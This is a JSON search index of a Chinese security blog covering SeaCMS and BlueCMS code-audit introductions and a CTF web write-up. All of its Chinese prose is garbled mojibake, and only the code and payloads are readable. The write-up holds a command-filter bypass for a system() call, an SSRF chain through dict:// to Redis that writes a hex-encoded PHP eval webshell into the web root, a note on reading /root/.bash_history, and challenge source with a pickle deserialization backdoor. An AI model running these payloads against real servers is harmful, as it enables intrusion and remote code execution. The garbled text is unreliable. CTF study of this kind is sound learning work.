[{"title":"SeaCMSä»£ç å®¡è®¡","path":"/2024/06/01/seacms-dai-ma-shen-ji/","content":"0x01 å‰è¨€ ä»Šå¤©å¼€å§‹ç¬¬äºŒä¸ªä»£ç å®¡è®¡SeaCMSï¼Œè¿™é‡Œæˆ‘é€‰æ‹©äº†ä¸€ä¸ªv10.1çš„ç‰ˆæœ¬ï¼ŒåŸå› æ˜¯æ‰¾äº†å‡ ç¯‡æ–‡ç« ï¼Œå‘ç°è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´æŒºå¤šï¼Œæ•…æ­¤ç»ƒä¹ ä¸€ä¸‹ï¼Œè¿˜æ˜¯å…ˆé è‡ªå·±ï¼Œä»¥æ–‡ç« ä¸ºè¾…ï¼Œå°½é‡è‡ªå·±å®¡å‡ºæ¥ å¦‚ä¸Šå›¾ï¼Œç®—æ˜¯æ­å»ºå®Œæˆã€‚ 0x02 å…¨å±€åˆ†æ æˆ‘ä»¬æŒ‰ç…§ä¸Šä¸€æ¬¡å®¡è®¡çš„æ€è·¯ï¼Œå…ˆåˆ†æå…¨å±€ æ€»ä½“çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°includeè¿™ä¸ªç›®å½•ä¸‹ä¼¼ä¹æ˜¯å…¬å…±å‡½æ•°çš„å­˜æ”¾åœ°ï¼Œè€Œtutpb3æ˜¯æœ‰å…³ç®¡ç†å‘˜adminçš„ä»£ç å¤„ç†ã€‚ Index.php index.php å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå‰é¢å°±æ˜¯åŠ è½½ç›¸å…³æ–‡ä»¶ï¼Œç„¶åè·å–ä¸€ä¸ªSERVERç±»å‹å˜é‡ï¼Œéšåæ˜¯å¯¹æŸäº›å…¨å±€å˜é‡çš„åˆ¤æ–­ï¼Œç„¶åç¡®å®šå‰ç½®è·³è½¬ï¼Œæœ€åè°ƒç”¨echoIndexå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ç”¨æ¥æ¸²æŸ“å‰ç«¯çš„ï¼Œä¼¼ä¹æ²¡å•¥ç‰¹æ®Šçš„åœ°æ–¹ã€‚ä¸ä¹‹å‰BlueCMSä¸åŒçš„åœ°æ–¹å°±æ˜¯ï¼Œè¿™é‡Œæ²¡æœ‰ä½¿ç”¨smarytæ¸²æŸ“ã€‚ å¹¶ä¸”å…¥å£é¡µé¢SeaCMSå†™çš„å¾ˆç®€æ´ã€‚ç„¶ååˆ†æä¸€ä¸‹è¯¥é¦–é¡µåŒ…å«çš„include/common.phpæ–‡ä»¶ Common.php å¼€å§‹éƒ¨åˆ†ä¾æ—§æ˜¯å®šä¹‰å¸¸é‡ï¼ŒåŒ…å«ç›¸å…³æ–‡ä»¶ï¼Œç„¶åè¿˜æ ¹æ®PHPç‰ˆæœ¬ï¼Œå†³å®šäº†GETã€POSTç­‰ä¼ å‚çš„å€¼ä»å“ªè·å– ç´§æ¥ç€ä¸‹é¢çš„è¿™äº›ç±»ä¼¼åœ°æ–¹ï¼Œä¸»è¦æ˜¯å…ˆè·å–SERVER_NAMEå˜é‡ï¼Œç„¶ååˆ¤æ–­GETã€POSTã€REQUESTç­‰å…¨å±€æ•°ç»„çš„é”®å€¼ä¸­ï¼Œæ˜¯å¦ä¼šåŒ¹é…åˆ°m_eregiä¸­çš„å…³é”®å­—ã€‚è¿™é‡Œçš„m_eregiå°±æ˜¯preg_matchçš„è¿›ä¸€æ­¥å®ç°å’Œæ”¹è¿› ä¹Ÿæ²¡å•¥å¤§çš„åŒºåˆ« ä¸‹é¢è¿™ä¸€éƒ¨åˆ†æ˜¯é€šè¿‡æŸäº›HTTPå¤´ä¿¡æ¯æ¥åˆ¤æ–­å®¢æˆ·ç«¯æ˜¯å¦æ˜¯æ‰‹æœºç§»åŠ¨è®¾å¤‡ è¿™ä¸ª_RunMagicQuoteså‡½æ•°æ˜¯ç”¨æ¥è¿‡æ»¤_GET','_POST','_COOKIE','_SERVER'è¿™äº›å…¨å±€å˜é‡çš„ ä¸‹é¢è¿™ä¸€éƒ¨åˆ†æ˜¯ç”¨æ¥è®¾ç½®ä¸€äº›ç«™ç‚¹çš„ç›¸å…³è·¯å¾„ä»¥åŠç›®å½• æœ€åè¿™éƒ¨åˆ†ä»£ç çš„ç›®çš„æ˜¯ç¡®ä¿å®šæ—¶ä»»åŠ¡æŒ‰è®¡åˆ’æ‰§è¡Œï¼Œä½¿ç”¨é”æ–‡ä»¶é˜²æ­¢ä»»åŠ¡é‡å…¥ï¼Œå¹¶åœ¨ä»»åŠ¡æ‰§è¡Œåæ›´æ–°ä»»åŠ¡ç¼“å­˜ã€‚å…³é”®æ­¥éª¤åŒ…æ‹¬æ£€æŸ¥ä»»åŠ¡æ‰§è¡Œæ—¶é—´ã€å¤„ç†é”æ–‡ä»¶ã€æ‰§è¡Œä»»åŠ¡å’Œæ›´æ–°ä»»åŠ¡è®¡åˆ’ã€‚","tags":["PHPä»£ç å®¡è®¡"],"categories":["PHPä»£ç å®¡è®¡"]},{"title":"çŸ©é˜µæ¯","path":"/2024/06/01/ju-zhen-bei/","content":"0x01 å‰è¨€ ç”±äºæ¯”èµ›å‰åŠå¤©æœ‰è€ƒè¯•å’ŒæŸäº›äº‹æƒ…ï¼Œå¯¼è‡´å¼€å§‹åšçš„æ—¶å€™ï¼Œé˜Ÿå‹å·²ç»è¾“å‡ºä¸¤ä¸ªäº†ï¼ˆREçš„ï¼ï¼‰tqlã€‚ å½“æ—¶å‘ç°æœ‰ä¸‰é“ç®€å•webï¼Œæ˜¯æœ‰æ€è·¯çš„ï¼Œä½†å°±æ˜¯è„‘å­æœ‰ç‚¹ç³Šï¼Œç„¶åä¸€ä¸ªé˜Ÿå‹reçš„åšå‡ºä¸¤é“webã€‚ã€‚ã€‚å‰©ä¸‹ä¸€ä¸ªç®€å•çš„ï¼Œè¢«å¦ä¸€ä¸ªwebçš„å¸ˆå‚…åšå‡ºæ¥äº†ï¼Œå‰©ä¸‹çš„é‚£ä¸ªéš¾çš„ï¼Œä¹Ÿæ˜¯æ— ä»ä¸‹æ‰‹ï¼Œåç‰¢ã€‚ã€‚ã€‚ä¸‹é¢å‡­å€Ÿå°è±¡å’Œé˜Ÿå‹çš„wpå­¦ä¹ ä¸€ç•ª 0x02 easyweb è¿™é“é¢˜è®°å¾—å…ˆæ˜¯æ‰«äº†ä¸ªç›®å½•ï¼Œç„¶åå‘ç°ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œä»æºç èƒ½è¯»åˆ°zipçš„æ³„éœ²ï¼Œä¸‹è½½å°±æ˜¯æŸä¸ªé¡µé¢çš„æºç ï¼Œä»£ç å¦‚ä¸‹ï¼š &nbsp; &lt;?php &nbsp; &nbsp; if (isset($_GET['id']) &amp;&amp; floatval($_GET['id']) !== '1' &amp;&amp; $_GET['id'] == 1) &nbsp; &nbsp; { &nbsp; &nbsp; echo 'welcome,admin'; &nbsp; &nbsp; $_SESSION['admin'] = True; &nbsp; &nbsp; } &nbsp; &nbsp; else &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; die('flag?'); &nbsp; &nbsp; } &nbsp; &nbsp; ?&gt; &nbsp; &nbsp; &lt;?php &nbsp; &nbsp; if ($_SESSION['admin']) &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; if(isset($_POST['code'])) &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; if(preg_match(\"/(ls|c|a|t| |f|i|n|d')/\", $_POST['code'])==1) &nbsp; &nbsp; &nbsp; echo 'no!'; &nbsp; &nbsp; &nbsp; elseif(preg_match(\"/[@#%^&amp;*()|\\/?&gt;&lt;']/\",$_POST['code'])==1) &nbsp; &nbsp; &nbsp; echo 'no!'; else system($_POST['code']); &nbsp; &nbsp; &nbsp; } &nbsp; &nbsp; } &nbsp; &nbsp; ?&gt; å¼€å§‹çš„è¯ç»™idèµ‹å€¼ä¸º1.0å³å¯ç»•è¿‡ã€‚ ç¬¬äºŒéƒ¨åˆ†å°±æ˜¯ç»•è¿‡æ­£åˆ™äº†ï¼Œå½“æ—¶æœ€å¼€å§‹æƒ³çš„è‡ªå¢ç»•è¿‡ï¼Œä½†æœ€åæå®Œäº†å‘ç°ï¼Œç”¨çš„æ˜¯systemå‡½æ•°ã€‚ã€‚ã€‚ç„¶åå›åˆ°æœ€å¼€å§‹ï¼Œæ€è€ƒå¦‚ä½•ç»•è¿‡çš„æ—¶å€™ï¼Œé˜Ÿå‹ç»™äº†æ€è·¯ï¼šç©ºå˜é‡ç»•è¿‡ ç©ºå˜é‡ è¿™æ€è·¯ä¹‹å‰ä¹Ÿæ²¡ç”¨è¿‡ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼Œæœ‰çš„æ–‡ç« è¿™æ ·ä»‹ç» $*å’Œ$@ï¼Œ$x(x ä»£è¡¨ 1-9),${x}(x&gt;=10) : æ¯”å¦‚ca${21}t a.txtè¡¨ç¤ºcat a.txt åœ¨æ²¡æœ‰ä¼ å…¥å‚æ•°çš„æƒ…å†µä¸‹ï¼Œè¿™äº›ç‰¹æ®Šå­—ç¬¦é»˜è®¤ä¸ºç©ºï¼Œå¦‚ä¸‹: wh$1oami who$@ami whoa$*mi ca$*t fl$*ag ca$@t fl$@ag ca$5t f$5lag ca${2}t f${2}lag ç„¶åæˆ‘ä»¬å¯ä»¥ç›´æ¥é”®å…¥code=l${1}sï¼Œå°±ç›¸å½“äºcode=lsï¼Œç»•è¿‡ä¹‹åï¼Œé¡µé¢å›æ˜¾718gï¼Œå½“æ—¶æˆ‘ä»¥ä¸ºæ˜¯ä¸ªç›®å½•è¿˜æ˜¯ä»€ä¹ˆçš„ï¼Œåˆæƒ³ç€æ€ä¹ˆæ‰èƒ½ç»§ç»­è¯»å–è¿™ä¸ªç›®å½•ï¼Œç»“æœå¸ˆå‚…å‘Šè¯‰æˆ‘ç›´æ¥è®¿é—®å°±è¡Œäº†ã€‚ã€‚ã€‚ã€‚å°¬ä½äº† ä¸è¿‡é™¤äº†è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘çŒœæµ‹è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œè¿˜å¯ä»¥l\\sç»•è¿‡ï¼Œ\\sç»“åˆåœ¨ä¸€èµ·ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå¯æœ‰å¯æ— çš„å­˜åœ¨ï¼Œè¿™é‡Œæ— éå°±æ˜¯ä¸€ä¸ªè½¬ä¹‰ç¬¦çš„æ„æ€ï¼Œå°†sè®¤ä¸ºæ˜¯æ™®é€šå­—ç¬¦ï¼Œå³ä½¿æ²¡æœ‰ï¼Œsä¹Ÿæ˜¯ä¸€ä¸ªæ™®é€šå­—ç¬¦ã€‚ä¸è¿‡è¿™æ ·å†™çš„è¯ï¼Œå¯ä»¥ç»•è¿‡ã€‚ å‚è€ƒæ–‡ç«  The-Starry-Sky 0x03 Tantantan è¿™é“é¢˜æ˜¯å¾ˆå¸¸è§„çš„ssrfæ‰“redisï¼Œç”±äºæ²¡ç¯å¢ƒäº†ï¼Œæˆ‘å€Ÿç”¨å¸ˆå‚…ä»¬çš„æˆªå›¾ é¦–é¡µè®¿é—®é¦–é¡µï¼Œè®©æˆ‘ä»¬é”®å…¥xssï¼Œæˆ‘è¿™é‡Œéšä¾¿è¾“å…¥äº†ä¹‹åï¼Œçœ‹äº†æºç ï¼Œå¾—åˆ°å¦ä¸€ä¸ªè·¯ç”±ï¼Œè®¿é—®å³å¯ åˆ°äº†è¿™ä¸ªé¡µé¢ï¼Œç›´è§‰å‘Šè¯‰æˆ‘ä»¬å¯ä»¥ä¼ªåè®®è¯»å–çœ‹çœ‹ï¼Œç„¶åå‘ç°æ˜¯å¯ä»¥çš„ï¼šfile:///var/www/html/index.phpï¼Œå¾—åˆ°æºç å‘ç°å’Œssrfæœ‰å…³ ç„¶åå°±æ˜¯å¸¸è§„çš„ç«¯å£æ¢æµ‹ï¼Œè¿™é‡Œæˆ‘ç”¨dictåè®®ï¼Œæ¢åˆ°6379ç«¯å£å‘ç°æœ‰å›æ˜¾ã€‚ ç„¶åå¸¸è§„çš„webè·¯å¾„å†™shellå³å¯ï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ˜¯é‡åˆ°äº†æ–°ä¸œè¥¿ï¼Œå½“æ—¶æ˜¯ç›´æ¥å°è¯•gopheråè®®æ‰“çš„ï¼Œä½†æ˜¯å‘é€äº†ä¹‹åæ²¡å›æ˜¾ï¼Œåæ¥æ„Ÿè§‰æ˜¯urlç¼–ç æ¬¡æ•°çš„é—®é¢˜ï¼Œåº”è¯¥æ˜¯ç¼–ç ä¸¤æ¬¡çš„ã€‚ ç„¶åæ–°çš„çŸ¥è¯†æ˜¯ï¼Œåœ¨hackbarä¸­ï¼Œç›´æ¥set:1:shell.phpï¼Œç”¨å†’å·ä»£æ›¿ç©ºæ ¼å³å¯ã€‚åŒæ—¶åœ¨åç»­å†™ä¸€å¥è¯æœ¨é©¬çš„æ—¶å€™ï¼Œéœ€è¦è½¬hexæ‰å¯ï¼Œä¸ç„¶å†™å…¥keyçš„æ—¶å€™ï¼Œå¯èƒ½ä¼šè¯†åˆ«ä¸æ­£å¸¸ï¼Œåˆ°äº†PHPå¤„ç†å™¨é‚£é‡Œï¼Œä¼šè‡ªåŠ¨å°†è¿™æ®µåå…­è¿›åˆ¶æ•°æ®è½¬ä¸ºå¯¹åº”çš„å­—ç¬¦ä¸² æœ€ç»ˆpayloadå¦‚ä¸‹ data=dict://127.0.0.1:6379/info data=dict://127.0.0.1:6379/config:set:dir:/var/www/html data=dict://127.0.0.1:6379/set:shell:\"\\x3c\\x3f\\x70\\x68\\x70\\x20\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x27\\x63\\x6d\\x64\\x27\\x5d\\x29\\x3b\\x3f\\x3e\" data=dict://127.0.0.1:6379/config:set:dbfilename:1.php data=dict://127.0.0.1:6379/save æœ€åå‘½ä»¤æ‰§è¡Œå³å¯ 0x04 Where è¿™é“é¢˜æ²¡æ¥å¾—åŠåšï¼Œå°±ç›´æ¥çœ‹ä¸€éå¸ˆå‚…çš„åšæ³•äº† è”æƒ³åˆ°è®¿é—®lookè·¯ç”±ï¼Œç»™fileä¼ å‚ï¼Œå‘ä¸‹èƒ½å¤Ÿè¯»å–app.pyæºç  from flask import Flask,Response, request app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): return \"flagè¢«æˆ‘è—èµ·æ¥äº†,/lookä¸€ä¸‹fileçœ‹çœ‹å‘¢\" @app.route('/look', methods=['GET', 'POST']) def readfile(): if request.values.get('file'): file = request.values.get('file') f= open(file,encoding='utf-8') content=f.read() f.close() if 'flag' in content: return \"æ‰“å¡ä¸‹ç­\"+content else: return \"æŠ“ç´§æ‰¾ï¼Œç€æ€¥ä¸‹ç­\"+content return \"æ‰¾æ‰¾çœ‹ï¼Œæˆ‘ç€æ€¥ä¸‹ç­\" if __name__ == '__main__': app.run(host='0.0.0.0', port=80) ä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰å½“æˆ‘ä»¬å†åˆ©ç”¨fileå‚æ•°æŸ¥æ‰¾æ–‡ä»¶å†…å®¹çš„æ—¶å€™ï¼Œå…¶ä¸­å«æœ‰flagå­—ç¬¦ï¼Œé‚£flagå°±å¾—åˆ°äº†ã€‚æ ¹æ®å¸ˆå‚…çš„è¯´æ³•ï¼Œè¿™åªèƒ½çŒœäº†ï¼Œçœ‹è‡ªå·±ç†è§£çš„æ•æ„Ÿç›®å½• è¿™é‡Œå¸ˆå‚…æœ€åæ˜¯è¯»å–äº†/root/.bash_historyå¾—åˆ°çš„flag 0x05 v_You_a_shell è¿™é“é¢˜æ²¡æ€è·¯ï¼Œèµ›åçœ‹äº†å±±æµ·ç»çš„wpï¼Œå‘ç°è¿™é“é¢˜ä»¥æˆ‘çš„æ°´å¹³éš¾ä»¥å¤ç°ï¼Œå°±æ”¾ä¸ªæºç å§ import dbus, time import dbus.service import dbus.mainloop.glib from gi.repository import GLib class FlagService(dbus.service.Object): def __init__(self, bus_name, object_path): dbus.service.Object.__init__(self, bus_name, object_path) @dbus.service.method(\"ctf.flag.service\", in_signature='', out_signature='s') def ping(self): return \"pong\" @dbus.service.method(\"ctf.flag.service\", in_signature='s', out_signature='s') def getTime(self, format): return __import__(\"json\").dumps({\"code\": 1, \"time\": time.strftime(format, time.localtime())}) dbus.mainloop.glib.DBusGMainLoop(set_as_default=True) bus = dbus.SystemBus() bus_name = dbus.service.BusName(\"ctf.flag.service\", bus) service = FlagService(bus_name, \"/ctf/flag/service\") loop = GLib.MainLoop() loop.run() import base64 import hashlib import pickle import random import threading import time import dbus import dbus.service import dbus.mainloop.glib from gi.repository import GLib from flask import Flask, session, request app = Flask(__name__) secretKey = \"\" def setSecretKet(): global secretKey secretKey = hashlib.md5(random.randbytes(16)).hexdigest() setSecretKet() app.secret_key = secretKey loginList = {} login_fail_times = 0 class MyDBusService(dbus.service.Object): def __init__(self, bus_name, object_path): dbus.service.Object.__init__(self, bus_name, object_path) @dbus.service.method(\"ctf.syncServer\", in_signature='', out_signature='s') def ping(self): return \"pong\" @dbus.service.method(\"ctf.syncServer\", in_signature='ss', out_signature='s') def backdoor(self, username, key): global secretKey if username in loginList and key == secretKey: data = pickle.loads(base64.b64decode(loginList[username])) return str(data) return \"keyError\" @app.route(\"/login\") def login(): global loginList global login_fail_times if login_fail_times == 5: login_fail_times = 0 session['code'] = hashlib.md5(random.randbytes(16)).hexdigest()[0:4] setSecretKet() username = request.args.get('username') password = request.args.get('password') code = request.args.get('code') data = request.cookies.get(\"data\", \"\") if code != session['code']: return \"codeError\" if username == \"admin\" and password == \"123456\": if data != \"\": loginList[username] = data else: loginList[username] = \"no\" return \"login successful\" login_fail_times += 1 return \"Password error\" @app.route(\"/getCode\") def getCode(): random.seed(int(time.time() * 10)) session['code'] = hashlib.md5(random.randbytes(16)).hexdigest()[0:4] return session['code'] def dbusServerStart(): dbus.mainloop.glib.DBusGMainLoop(set_as_default=True) bus = dbus.SystemBus() bus_name = dbus.service.BusName(\"ctf.syncServer\", bus) service = MyDBusService(bus_name, \"/ctf/syncServer\") loop = GLib.MainLoop() loop.run() if __name__ == \"__main__\": threading.Thread(target=dbusServerStart).start() app.run(host=\"127.0.0.1\", port=8080) çœ‹äº†wpæ€è·¯æ˜¯ï¼šé¢„æµ‹secretkeyï¼Œç„¶åååºåˆ—åŒ–æ•°æ®ï¼Œæ‹¿åˆ°flag å‰©ä¸‹çš„æ¼æ´æŒ–æ˜èµ›ï¼Œå°±çº¯åç‰¢ï¼Œæ²¡å•¥æ€è·¯ã€‚ 0x06 åè®° è¢«æ¯”èµ›æ‰“æŠ‘éƒäº†ï¼Œè¾“å‡ºå¯æ€œï¼Œä½†è¿™æ¬¡çŸ©é˜µæ¯çš„webä¹Ÿæ˜¯æˆ‘è§è¿‡æ‰€æœ‰æ­£è§„æ¯”èµ›ä¸­ï¼Œwebç®€å•çš„ä¸€æ¬¡äº†ã€‚ åšæŒåˆ·é¢˜ï¼ŒåšæŒæ‰“æ¯”èµ›ï¼Œå¸Œæœ›è‡ªå·±æœ‰æœä¸€æ—¥å¯ä»¥æœ‰æ‰€è¾“å‡ºã€‚ã€‚ã€‚ã€‚","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"BlueCMSä»£ç å®¡è®¡","path":"/2024/05/29/bluecms-dai-ma-shen-ji/","content":"0x01 ç¯å¢ƒæ­å»º è¿™é‡Œä¸èµ˜è¿°ï¼Œç½‘ä¸Šæœæœéƒ½æœ‰çš„ï¼Œæˆ‘ä¹ŸæŠŠå‚è€ƒæ–‡ç« æ”¾åˆ°äº†æ–‡æœ«ï¼Œä¸»è¦è¿˜æ˜¯ç»†å¿ƒé—®é¢˜ï¼Œè¿˜æ˜¯å¯ä»¥æ­å»ºæˆåŠŸçš„ï¼ˆä½†æˆ‘å´è¸©äº†å¾ˆå¤šå‘ 0x02 å‰ç½®çŸ¥è¯† æ˜ç¡®ç›®æ ‡ï¼š åœ¨å®¡è®¡ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆå…ˆç¡®å®šè‡ªå·±æ­¤æ¬¡å®¡è®¡çš„ç›®åœ°ï¼Œä¸€èˆ¬ä¼šæœ‰ä¸‰ç§æƒ…å†µï¼š ä¸ºäº†æå‡è‡ªå·±çš„å®¡è®¡ç»éªŒ é¡¹ç›®ä¸­ä¸ºäº†å®¡è®¡å‡ºèƒ½è¿›ä¸€æ­¥åˆ©ç”¨çš„æ¼æ´ï¼Œä¸€èˆ¬éœ€è¦getshellã€ssrfè¿™ç§çº§åˆ«çš„ã€‚ ä¸ºäº†æŒ–ç‚¹æ´ï¼Œå»æ¢é’±æˆ–è€…æ¢cve&amp;cnvdã€‚ å¦‚æœæ˜¯ä¸ºäº†æå‡å®¡è®¡ç»éªŒï¼Œåº”è¯¥è¦å»é‡ç‚¹å…³æ³¨å†å²æ¼æ´ï¼Œå¹¶å»å¤ç°ã€‚ å¦‚æœæ˜¯ä¸ºäº†èƒ½å®¡å‡ºæ¼æ´ï¼Œå»ç”¨ä½œæ¸—é€ä¸­çš„è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œé‚£ä¹ˆæˆ‘è§‰å¾—ï¼Œå¯ä»¥é‡ç‚¹ä½¿ç”¨xcheckã€Fotifyç­‰è‡ªåŠ¨åŒ–ä»£ç å®¡è®¡ï¼Œç„¶åå…³æ³¨ä¸‹é¢çš„æ–‡ä»¶ä¸Šä¼ ã€åŒ…å«ã€sqlæ³¨å…¥ç­‰ç­‰æœ‰ä¸¥é‡å±å®³çš„æ¼æ´ å¦‚æœæ˜¯ä¸ºäº†æŒ–0dayï¼Œæè¯ä¹¦ä»€ä¹ˆçš„ï¼Œé‚£ä¹ˆå…¨æ–¹ä½æŒ‰æ­¥éª¤è¿‡ä¸€éï¼Œæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚ ä½¿ç”¨æ¡†æ¶ åˆ¤æ–­æ˜¯å¦ä½¿ç”¨äº†æ¡†æ¶ï¼Œæ˜¯è›®é‡è¦çš„ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿå®šä½æœ‰ç”¨çš„å‡½æ•°é›†ï¼Œç­›é€‰ä¸éœ€è¦å»çœ‹çš„ä»£ç ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘è§‰å¾—ä½¿ç”¨äº†æ¡†æ¶çš„æ›´å¥½å®¡è®¡ä¸€ç‚¹ï¼Œå› ä¸ºä½¿ç”¨äº†æ¡†æ¶çš„ï¼Œä»–çš„å‡½æ•°é›†æ–‡ä»¶ï¼ˆå„ç§æ–¹æ³•functionï¼‰ä¼šæ¯”è¾ƒè§„æ•´ï¼Œåœ¨æŸäº›å›ºå®šæ–‡ä»¶å¤¹ä¸­ï¼Œæ¸…æ™°å¯è§ï¼Œå½“ç„¶éœ€è¦æˆ‘ä»¬å…ˆå¯¹æ¡†æ¶æœ‰æ‰€äº†è§£ã€‚ ç›®å‰æ¯”è¾ƒä¸»æµçš„è®¾è®¡æ¨¡å¼æ˜¯MVCï¼Œå³å¤šå±‚æ¨¡å‹ï¼ˆMï¼‰ã€è§†å›¾ï¼ˆVï¼‰ã€æ§åˆ¶å™¨ï¼ˆCï¼‰ï¼Œåœ¨æ­¤ä¸å¤šèµ˜è¿°ï¼Œphpçš„ä¸»æµæ¡†æ¶å‡ ä¹éƒ½ä½¿ç”¨äº†MVCè®¾è®¡æ¨¡å¼ã€‚PHPåº•ä¸‹çš„å¼€å‘æ¡†æ¶ç›®å‰è§çš„æ¯”è¾ƒå¤šçš„æœ‰Laravelï¼ŒThinkPHPï¼Œyiç­‰ã€‚ å®¡è®¡æµç¨‹ çœ‹äº†ä¸€ç¯‡æ–‡ç« æ˜¯è¿™æ ·è¯´çš„ï¼ŒPHPä»£ç å®¡è®¡è¿‡ç¨‹æ˜¯ï¼š PHPåŸºç¡€è¯­æ³•å·©å›º-ã€‹PHPç‰¹æ€§-ã€‹å„ç±»æ¼æ´æŒ–æ˜æ–¹æ³•-ã€‹æ—©æœŸCMSç¨‹åºä»£ç å®¡è®¡å®æˆ˜-ã€‹MVCæ¨¡å¼ç¨‹åºä»£ç å®¡è®¡å®æˆ˜ã€‚ è¿™ä½å¸ˆå‚…é€‰æ‹©çš„CMSå®æˆ˜ä¾æ¬¡æ˜¯è¿™æ ·çš„ï¼šBlueCMS, SeaCMS, DedeCMS, PhpCMS è¿™ 4 ä¸ªCMSï¼ˆæˆ‘è®¤ä¸ºæˆ‘ä¹Ÿå¯ä»¥é‡‡ç”¨è¿™ä¸ªè·¯çº¿ï¼‰éš¾åº¦é€æ¸æå‡ã€‚åœ¨å¯¹è¿™å‡ ä¸ªç³»ç»Ÿçš„ä»£ç å®¡è®¡è¿‡ç¨‹ä¸­ï¼Œä¹Ÿèƒ½æ„Ÿå—åˆ° web å¼€å‘æŠ€æœ¯çš„å‘å±•å’Œè¶‹åŠ¿ï¼Œç›´åˆ°PhpCMSï¼Œå‘ç°å·²ç»å®ç°äº†ä¸€ä¸ªMVCæ¨¡å‹çš„ç¨‹åºã€‚ç›¸ä¿¡å®Œæˆè¿™æ­¥åå†å®¡è®¡é MVC æ¨¡å¼ç¨‹åºçš„ä»£ç å°±ä¼šå…·æœ‰æ¸…æ™°çš„æ€è·¯ä¸åè¶³çš„æŠŠæ¡ã€‚ BlueCMSç®€ä»‹ BlueCMS æ˜¯ä¸€æ¬¾åº”ç”¨äºåœ°æ–¹åˆ†ç±»ä¿¡æ¯çš„é—¨æˆ·ç³»ç»Ÿï¼Œæœ¬æ–‡ä¸‹è½½çš„æºç ä¸º BlueCMS v1.6 sp1ç‰ˆï¼Œå¯ä»¥è¿½æº¯åˆ°2010å¹´å·¦å³äº†ï¼Œè¯¥ç³»ç»Ÿç¡®å®å¾ˆè€ï¼Œä½†å®¡è®¡è¯¥ç³»ç»Ÿæœ‰ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå³ä½¿ç°åœ¨webå¼€å‘æŠ€æœ¯ååˆ†æˆç†Ÿäº†ï¼Œä½†ä»æœ‰äººå› ä¸ºç»éªŒç¼ºä¹æˆ–æ—¶é—´åŸå› ä¼šå¼€å‘å‡ºç±»ä¼¼BlueCMSè¿™æ ·ç®€å•çš„ç³»ç»Ÿï¼Œç”šè‡³æ¯”BlueCMSæ›´ç®€å•ã€‚é€šè¿‡å¯¹ BlueCMS å®æˆ˜å®¡è®¡ï¼Œèƒ½å¤Ÿç†Ÿæ‚‰è¿™ç±»ç®€å• CMS çš„ç¨‹åºé€»è¾‘ã€‚ BlueCMS è¢«è®¤ä¸ºæ˜¯ç»ƒæ‰‹ä»£ç å®¡è®¡çš„ç»ä½³é¡¹ç›®ï¼Œä»¥è‡³äºç°åœ¨ç™¾åº¦BlueCMSçš„å…³é”®è¯å…¨æ˜¯ä»£ç å®¡è®¡ã€‚é‚£ä¸ºä»€ä¹ˆ BlueCMS éƒ½è¢«å®¡è®¡çƒ‚äº†ï¼Œæˆ‘è¿˜è¦åœ¨å‘ä¸€ç¯‡BlueCMSçš„ä»£ç å®¡è®¡åšå®¢å‘¢ï¼Ÿé¦–å…ˆBlueCMSç¡®å®ç»å…¸ï¼Œæ˜¯ä¸€ä¸ªå…¥é—¨çš„å¥½é¡¹ç›®ï¼›å…¶æ¬¡BlueCMSæ˜¯æ— MVCæ¶æ„æ—¶æœŸæœ€æ—©æµè¡Œçš„ä¸€æ‰¹CMSï¼Œæ˜¯æ—©æœŸCMSç¨‹åºä»£ç å®¡è®¡å®æˆ˜ç³»åˆ—æœ€æ ‡å¿—çš„ç¬¬ä¸€ç¯ã€‚ BlueCMSæœ¬åœ°éƒ¨ç½²å¥½åï¼Œå…ˆè®¿é—® /install/index.php è¿›è¡Œå®‰è£…ï¼Œæ„Ÿè§‰è¿‡ç¨‹æœ‰ç‚¹bugï¼Œä¸è¿‡è¿”å›é¦–é¡µåä¼šå‘ç°å®‰è£…æˆåŠŸã€‚ æŒ‰ç…§è¦æ±‚å®Œæˆä¹‹åï¼Œè®¿é—®é¦–é¡µå‡ºç°ä¸Šå›¾å³å¯ä»£è¡¨å®‰è£…æˆåŠŸ 0x03 å‰æœŸå®¡è®¡ è¿™é‡Œä¸»è¦è¿˜æ˜¯è·Ÿç€æ–‡ç« èµ°ï¼Œæ²¡æ€è·¯ã€‚ å…¥å£ç‚¹åˆ†æ é¦–å…ˆåˆ†æç›®å½•ç»“æ„ é€šè¿‡ç›®å½•ç»“æ„èƒ½å¤Ÿçœ‹å‡ºç®€å•çš„ç¨‹åºé€»è¾‘ï¼Œç›®å½•ç»“æ„ä¸»è¦æ˜¯å…³æ³¨å…¥å£ç‚¹ï¼Œä¹Ÿå°±æ˜¯index.phpæ–‡ä»¶ä½ç½®ï¼Œè¯¥CMSä¸‹çš„ç¨‹åºï¼Œindex.phpå°±ä½äºæ ¹ç›®å½•ä¸‹ï¼Œè¿™æ˜¯ä¸å®‰å…¨çš„ï¼Œä¼šå¯¼è‡´æ•´ä¸ªæ–‡ä»¶è¢«çªƒå–çš„é£é™©ã€‚ æ¥ä¸‹æ¥è·Ÿç€æ–‡ç« è‡ªè¡Œåˆ†æä¸€è¾¹è¿™ä¸ªå…¥å£æ–‡ä»¶ define(\"IN_BLUE\",true); require_once('include/common.inc.php'); require_once(BLUE_ROOT.'include/index.fun.php'); 